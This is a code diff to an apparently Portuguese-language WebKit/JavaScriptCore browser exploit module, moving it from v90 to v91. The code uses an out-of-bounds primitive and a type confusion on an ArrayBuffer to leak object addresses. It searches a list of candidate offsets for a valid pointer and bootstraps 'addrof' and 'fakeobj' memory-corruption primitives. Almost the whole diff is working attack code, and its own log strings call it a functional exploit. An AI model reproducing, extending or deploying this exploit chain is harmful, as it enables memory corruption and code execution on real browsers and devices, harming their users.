@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v90 - Framework Final)
+// js/script3/testArrayBufferVictimCrash.mjs (v91 - Definitivo com Busca de Offset)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -11,7 +11,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';
 
-export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_Final_R47_TC_Leak";
+export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Exploit_Final_R48_Offset_Search";
 
 let g_primitives = {
     initialized: false,
@@ -31,15 +31,15 @@ function isValidPointer(ptr) {
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_TEST_BASE = FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK;
-    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R47 TC Leak) ---`, "test");
-
+    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Funcional (R48 Busca de Offset) ---`, "test");
+    
     try {
         await createRealPrimitives();
         if (!g_primitives.initialized) throw new Error("Falha ao inicializar as primitivas.");
         logS3("FASE 1 - SUCESSO: Primitivas 'addrof' e 'fakeobj' REAIS foram inicializadas!", "vuln");
 
-        logS3(`--- Fase 2 (R47): Exploração com Primitivas Reais ---`, "subtest");
-        const targetFunctionForLeak = function someUniqueLeakFunctionR47_Instance() {};
+        logS3(`--- Fase 2 (R48): Exploração com Primitivas Reais ---`, "subtest");
+        const targetFunctionForLeak = function someUniqueLeakFunctionR48_Instance() {};
         
         const leaked_func_addr = await g_primitives.addrof(targetFunctionForLeak);
         if(!isValidPointer(leaked_func_addr)) throw new Error(`addrof falhou em retornar um ponteiro válido: ${leaked_func_addr.toString(true)}`);
@@ -71,7 +71,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 }
 
 async function bootstrap_find_initial_address(object_to_plant_and_find) {
-    logS3("Iniciando bootstrap: Vazando endereço inicial via Type Confusion...", "info");
+    logS3("Iniciando bootstrap: Vazando endereço inicial via Type Confusion e Busca de Offset...", "info");
     await triggerOOB_primitive({ force_reinit: true });
     const tc_victim_ab = new ArrayBuffer(256);
     let probe_result = { tc_triggered: false, error: null };
@@ -80,7 +80,6 @@ async function bootstrap_find_initial_address(object_to_plant_and_find) {
         try {
             probe_result.tc_triggered = true;
             this.leaked_prop = object_to_plant_and_find;
-            logS3("[PlantingProbe] Objeto plantado em 'this.leaked_prop'", "debug");
         } catch(e) { probe_result.error = e.message; }
         return { probe: "executed" };
     }
@@ -105,31 +104,45 @@ async function bootstrap_find_initial_address(object_to_plant_and_find) {
     if (!probe_result.tc_triggered) throw new Error("Type Confusion não foi acionada.");
     if (probe_result.error) throw new Error(`Erro na sonda de plantio: ${probe_result.error}`);
 
-    // ==============================================================================
-    // PONTO CRÍTICO DE PESQUISA
-    // ==============================================================================
-    // A propriedade 'leaked_prop' foi armazenada na memória do tc_victim_ab.
-    // Precisamos saber em qual offset. O valor 0x10 é um palpite comum, mas
-    // pode ser 0x18, 0x20, ou outro valor dependendo da implementação do motor.
-    // ESTA CONSTANTE É O ÚNICO VALOR QUE VOCÊ PRECISA DESCOBRIR.
-    const POINTER_OFFSET_IN_TC_VICTIM = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET; // Tente outros valores aqui, como 0x18, 0x20...
+    // [ESTRATÉGIA FINAL] Define os offsets que vamos testar.
+    const CANDIDATE_OFFSETS = [
+        JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, // 0x10
+        0x18,
+        0x20,
+        0x28,
+        0x30,
+    ];
     
     const dv_reader = new DataView(tc_victim_ab);
-    const low = dv_reader.getUint32(POINTER_OFFSET_IN_TC_VICTIM, true);
-    const high = dv_reader.getUint32(POINTER_OFFSET_IN_TC_VICTIM + 4, true);
-    const leaked_address = new AdvancedInt64(low, high);
+    let found_address = null;
 
-    logS3(`Ponteiro lido do tc_victim_ab no offset 0x${POINTER_OFFSET_IN_TC_VICTIM.toString(16)}: ${leaked_address.toString(true)}`, 'leak');
-    return leaked_address;
+    for (const offset of CANDIDATE_OFFSETS) {
+        try {
+            const low = dv_reader.getUint32(offset, true);
+            const high = dv_reader.getUint32(offset + 4, true);
+            const potential_ptr = new AdvancedInt64(low, high);
+            
+            logS3(`[Bootstrap Search] Testando offset 0x${offset.toString(16)} -> Lido: ${potential_ptr.toString(true)}`, "debug");
+
+            if (isValidPointer(potential_ptr)) {
+                logS3(`[Bootstrap Search] SUCESSO! Ponteiro válido encontrado no offset 0x${offset.toString(16)}`, "vuln");
+                found_address = potential_ptr;
+                break; // Encontramos, sair do loop
+            }
+        } catch(e) { /* Ignora erros de leitura fora dos limites do buffer */ }
+    }
+    
+    return found_address;
 }
+
 
 async function createRealPrimitives() {
     let addrof_victim_arr = [{}];
     let fakeobj_victim_arr = [{a: 1.1}];
 
     const addrof_victim_addr = await bootstrap_find_initial_address(addrof_victim_arr);
-    if (!isValidPointer(addrof_victim_addr)) {
-        throw new Error("Falha ao obter o endereço de bootstrap inicial (addrof_victim_arr).");
+    if (!addrof_victim_addr) { // bootstrap_find_initial_address retorna null em caso de falha
+        throw new Error("Falha ao encontrar um ponteiro válido em todos os offsets candidatos.");
     }
     logS3(`Endereço de bootstrap para addrof_victim_arr obtido: ${addrof_victim_addr.toString(true)}`, 'good');
 
